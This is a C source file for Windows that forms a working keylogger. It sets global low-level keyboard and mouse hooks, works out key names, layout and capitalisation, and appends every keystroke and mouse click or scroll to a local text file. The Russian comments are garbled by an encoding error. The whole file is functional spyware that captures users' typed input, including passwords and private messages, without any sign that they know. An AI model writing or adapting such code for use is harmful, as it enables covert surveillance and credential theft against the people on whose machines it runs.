
#include <windows.h>
#include <stdio.h>
#define STRING_SIZE 20
#define RUS 1049
#define ENG 1033
#define PATH L"Text.txt"


LRESULT CALLBACK MouseKey(int, WPARAM, LPARAM);
void WriteToFile(LPWSTR);
LRESULT CALLBACK KeyBoardKey(int , WPARAM , LPARAM );

int WINAPI WinMain(HINSTANCE hlnstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	HHOOK hHookMouse = SetWindowsHookExW(WH_MOUSE_LL, MouseKey, NULL, NULL);
	HHOOK hHookKeyBoard = SetWindowsHookExW(WH_KEYBOARD_LL, KeyBoardKey, NULL, NULL);
	MSG msg = { 0 };
	while (GetMessageW(&msg, 0, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessageW(&msg);
	}
	UnhookWindowsHookEx(hHookMouse);
	UnhookWindowsHookEx(hHookKeyBoard);
	return 0;

}

BOOL IsCaps() // ������� �������� �������� �������
{
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ^ (GetKeyState(VK_SHIFT) & 0x8000) != 0)
	{
		return TRUE;
	}
	return FALSE;
}

LRESULT CALLBACK KeyBoardKey(int iCode, WPARAM wParam, LPARAM lParam)// ������� ��� hook �������������� ������� ����������
{
	if (wParam == WM_KEYDOWN)
	{
		PKBDLLHOOKSTRUCT pHook = (PKBDLLHOOKSTRUCT)lParam; // ��������� � ������� �������� ������ ������� 
		//char c = (char)pHook->vkCode; //��� ���� ����� �������� �����, �� ������� ���� "������" �� ����� ������������
 		WORD KeyLayout = LOWORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0))); // ����� ��� ����������� ����������
		DWORD iKey = MapVirtualKey(pHook->vkCode, NULL) << 16; // �������� ��� ������� � �������� ��� �� 16 ����� �����
		if (!(pHook->vkCode <= 1 << 5)) // �� ���� ��� ���
		{
			iKey |= 0x1 << 24;
		}
		
		LPWSTR KeyStr = (LPWSTR)calloc(STRING_SIZE + 1, 2); // ������ � ������� ����� ���������� �������� ������� ������
		GetKeyNameTextW(iKey, KeyStr, STRING_SIZE); // �������� �������� ������ � ���������� � ������
		if (wcslen(KeyStr) > 1) // �������� ���� ��� ������� �� ��������� (��� "������")
		{ 
			WriteToFile(L"[");
			WriteToFile(KeyStr);
			WriteToFile(L"]");
		}
		else
		{
			if (!IsCaps())// �������� ���� ��� ������� �� � ������� ��������
			{
				KeyStr[0] = tolower(KeyStr[0]);
			}
			WriteToFile(KeyStr); // ������ � ����
		}
		free(KeyStr);
	}
	return CallNextHookEx(0, iCode, wParam, lParam);
}

LRESULT CALLBACK MouseKey(int iCode, WPARAM wParam, LPARAM lParam)//hook ��� ����
{
	LPWSTR KeyStr = (LPWSTR)calloc(STRING_SIZE, 2); // ������ � ������� ���������� �������� ������� ������
	MSLLHOOKSTRUCT* p = (MSLLHOOKSTRUCT*)lParam; // ���������� ���������� ���� � ������� (��������� ����� ������ � ����� ������� �������� �������)
	switch (wParam)
	{
	case WM_LBUTTONDOWN: //����� ������ ����
		KeyStr = L"[���]";
		WriteToFile(KeyStr);
		break;
	case WM_RBUTTONDOWN: //������ ������ ����
		KeyStr = L"[���]";
		WriteToFile(KeyStr);
		break;
	case WM_MBUTTONDOWN: // ������� �� ������
		KeyStr = L"[���]";
		WriteToFile(KeyStr);
		break;
	case WM_MOUSEWHEEL:	// ������� �������� 	
		if ((*p).mouseData == 4287102976)//4287102976 ���� (���-�� ������ ���� �������������, �� ������ �� �� �������������)
		{
			KeyStr = L"[��˨����_����]";
			WriteToFile(KeyStr);
		}
		if ((*p).mouseData == 7864320)//7864320 ����� (���-�� ������ ���� �������������)
		{
			KeyStr = L"[��˨����_�����]";
			WriteToFile(KeyStr);
		}
		break;
	}
	//free(KeyStr); //������ �� �� ��������
	return CallNextHookEx(0, iCode, wParam, lParam);
}

void WriteToFile(LPWSTR str) // ������� ��� ������ � ����
{
	FILE* file;
	_wfopen_s(&file, PATH, L"ab");
	if (file != NULL)
	{
		int a = wcslen(str);
		fwrite(str, sizeof(WCHAR), wcslen(str), file);
		fclose(file);
	}
}